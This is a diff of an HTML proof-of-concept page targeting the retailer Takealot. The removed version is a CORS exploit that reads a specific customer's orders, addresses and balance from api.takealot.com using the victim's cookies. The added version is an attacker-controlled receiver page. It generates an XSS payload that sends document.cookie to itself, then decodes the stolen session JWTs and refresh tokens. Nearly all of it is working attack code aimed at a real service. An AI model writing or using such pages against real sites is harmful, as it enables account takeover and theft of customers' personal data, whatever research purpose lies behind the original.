@@ -1,47 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Takealot CORS PoC v2</title>
+  <title>Takealot CWE-1004 PoC</title>
+  <style>
+    body { font-family: monospace; padding: 20px; background: #111; color: #eee; }
+    h1 { color: #f55; }
+    h2 { color: #fa0; margin-top: 30px; }
+    pre { background: #1e1e1e; padding: 15px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+    .dim { color: #888; }
+    table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
+    td, th { border: 1px solid #444; padding: 8px 12px; text-align: left; }
+    th { background: #222; }
+    h3 { color: #4af; }
+  </style>
 </head>
 <body>
-<h1>Takealot CORS PoC</h1>
-<p>
-  When a logged-in Takealot user visits this page, their session cookies are
-  sent automatically. The CORS misconfiguration on api.takealot.com allows this
-  cross-origin response to be read by attacker-controlled JavaScript.
+<h1>Takealot CWE-1004 PoC</h1>
+<p class="dim">
+  CWE-1004: Sensitive cookies are missing the <code>HttpOnly</code> flag.<br>
+  Any XSS payload on takealot.com can read and exfiltrate them via <code>document.cookie</code>.<br>
+  This page is the attacker-controlled receiver. Cookies arrive via the URL fragment.
 </p>
 
-<h2>Probe Results</h2>
-<pre id="probe">Running...</pre>
+<h2>XSS Exfiltration Payload</h2>
+<p class="dim">Inject this anywhere JavaScript executes on takealot.com:</p>
+<pre id="payload"></pre>
+
+<h2>Stolen Cookies</h2>
+<pre id="raw-cookies">Waiting for data in URL fragment (#c=...)...</pre>
+
+<h2>Decoded Tokens</h2>
+<div id="tokens"><p class="dim">No tokens decoded yet.</p></div>
 
 <script>
-// These endpoints were confirmed to reflect Access-Control-Allow-Origin
-// with credentials — meaning we can read the response body cross-origin.
-// The browser automatically sends the victim's session cookies on each request.
-const endpoints = [
-  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/credits/balance" },
-  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/summary" },
-  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/wishlist" },
-  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/addresses" },
-  { method: "GET",  url: "https://api.takealot.com/rest/v-1-16-0/customers/2678447/orders" },
-];
+const RECEIVER = window.location.origin + window.location.pathname;
 
-const results = [];
+document.getElementById("payload").innerText =
+  "window.location='" + RECEIVER + "#c='+encodeURIComponent(document.cookie);";
 
-async function run() {
-  for (const { method, url } of endpoints) {
-    try {
-      const r    = await fetch(url, { method, credentials: "include" });
-      const data = await r.json();
-      results.push({ url, status: r.status, cors: "READABLE", body: data });
-    } catch (e) {
-      results.push({ url, cors: "BLOCKED", error: String(e) });
-    }
-    document.getElementById("probe").innerText = JSON.stringify(results, null, 2);
+function decodeJwtPayload(token) {
+  try {
+    const base64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
+    return JSON.parse(atob(base64));
+  } catch(e) {
+    return null;
   }
 }
 
-run();
+function parseCookies(str) {
+  return Object.fromEntries(
+    str.split(';').map(function(p) {
+      const parts = p.trim().split('=');
+      const k = parts.shift();
+      return [k, decodeURIComponent(parts.join('='))];
+    })
+  );
+}
+
+function renderTokens(cookies) {
+  const tokenKeys = ['tal_jwt', 'taid', 'tal_refresh_token'];
+  const container = document.getElementById("tokens");
+  container.innerHTML = '';
+
+  for (const key of tokenKeys) {
+    if (!cookies[key]) continue;
+    const decoded = decodeJwtPayload(cookies[key]);
+    if (!decoded) continue;
+
+    const h = document.createElement('h3');
+    h.textContent = key;
+    container.appendChild(h);
+
+    const table = document.createElement('table');
+    table.innerHTML = '<tr><th>Claim</th><th>Value</th></tr>';
+    for (const [claim, val] of Object.entries(decoded)) {
+      const row = table.insertRow();
+      row.insertCell().textContent = claim;
+      const valCell = row.insertCell();
+      if (['exp', 'iat', 'nbf'].includes(claim) && typeof val === 'number') {
+        valCell.textContent = val + '  →  ' + new Date(val * 1000).toUTCString();
+      } else {
+        valCell.textContent = typeof val === 'object' ? JSON.stringify(val) : val;
+      }
+    }
+    container.appendChild(table);
+  }
+
+  if (!container.innerHTML) {
+    container.innerHTML = '<p class="dim">No known JWT cookies found in the stolen data.</p>';
+  }
+}
+
+const fragment = window.location.hash;
+if (fragment.startsWith('#c=')) {
+  const raw = decodeURIComponent(fragment.slice(3));
+  document.getElementById("raw-cookies").innerText = raw;
+  renderTokens(parseCookies(raw));
+} else if (document.cookie) {
+  document.getElementById("raw-cookies").innerText =
+    "(no fragment — showing current page cookies for demo)\n\n" + document.cookie;
+  renderTokens(parseCookies(document.cookie));
+}
 </script>
 </body>
 </html>
